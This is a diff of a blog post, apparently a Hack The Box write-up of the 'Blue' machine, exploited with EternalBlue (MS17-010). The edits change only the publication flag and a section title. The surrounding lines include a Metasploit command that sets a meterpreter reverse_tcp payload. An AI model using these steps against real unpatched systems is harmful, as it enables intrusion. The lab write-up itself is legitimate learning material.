@@ -11,14 +11,14 @@ tags:
 - ms17-010
 description: ''
 categories:
-published: false
+published: true
 comments: false
 ---
 
 ![intro](https://an00brektn.github.io/img/htb-blue/Pasted image 20210905175327.png)
 
 ## Intro
-Blue is arguably the easiest box on the entire HTB platform. Root blood went in ~2 minutes, and for good reason. As the name of the box suggests, the vulnerability that we'll be focusing on is EternalBlue, an exploit developed by the NSA and leaked by the ShadowBrokers in 2017. I'll leverage this exploit without Metasploit to basically instantly get SYSTEM privileges. While the exploitation isn't that long, in Beyond Root (I definitely ripped this idea from 0xdf), I'll look at the Metasploit module and (from an amateur's eyes) try and see what makes it so inconsistent as compared to the one I use.
+Blue is arguably the easiest box on the entire HTB platform. Root blood went in ~2 minutes, and for good reason. As the name of the box suggests, the vulnerability that we'll be focusing on is EternalBlue, an exploit developed by the NSA and leaked by the ShadowBrokers in 2017. I'll leverage this exploit without Metasploit to basically instantly get SYSTEM privileges. While the exploitation isn't that long, in Beyond the Flag, I'll look at the Metasploit module and (from an amateur's eyes) try and see what makes it so inconsistent as compared to the one I use.
 
 ## Recon
 Always gotta **nmap** scan first.
@@ -242,7 +242,7 @@ type C:\Users\haris\Desktop\user.txt
 4c546aea************************
 ```
 
-## Beyond Root
+## Beyond the Flag
 After a quick reset to make sure nothing goes wrong, I'm going to try using Metasploit now.
 ```sh
 msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/meterpreter/reverse_tcp
